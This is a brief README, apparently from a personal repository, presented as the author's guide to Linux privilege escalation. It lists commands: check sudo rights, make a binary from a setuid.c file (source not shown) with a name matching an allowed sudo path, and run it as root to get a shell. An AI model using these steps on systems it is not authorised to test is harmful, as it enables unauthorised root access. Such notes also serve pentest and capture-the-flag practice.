# SetUID
My personal guide to get privesc

# How to Use
Run ```sudo -l```
Read which commands can be executed by root (for example ```test/nameFile```)
Run ```mkdir test```
Move *setuid.c* in *test* 
```mv setuid.c test```
Compile script 
```gcc setuid.c -o nameFile```
Run as root
```sudo -u root nameFile```
Get Shell
